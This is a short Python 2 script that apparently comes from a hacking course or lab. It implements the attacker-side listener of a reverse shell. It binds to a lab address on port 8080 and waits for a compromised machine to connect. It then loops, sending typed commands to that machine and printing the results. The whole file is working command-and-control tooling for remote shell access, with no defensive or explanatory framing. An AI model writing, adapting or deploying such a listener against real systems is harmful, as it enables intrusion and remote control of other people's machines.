import socket

class SocketListener:
    def __init__(self,ip,port):
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Listener.bind((ip, port))
        Listener.listen(0)
        print('Listening...')
        (self.Connection, Address) = Listener.accept()
        print('Connection Successful from ' + str(Address))

    def command_execution(self, command_input):
        self.Connection.send(command_input)
        return self.Connection.recv(1024)

    def start_listener(self):
        while True:
            command_input = raw_input('Enter Command: ')
            command_output = self.command_execution(command_input)
            print(command_output)

socket_listener = SocketListener('10.0.2.15',8080)
socket_listener.start_listener()
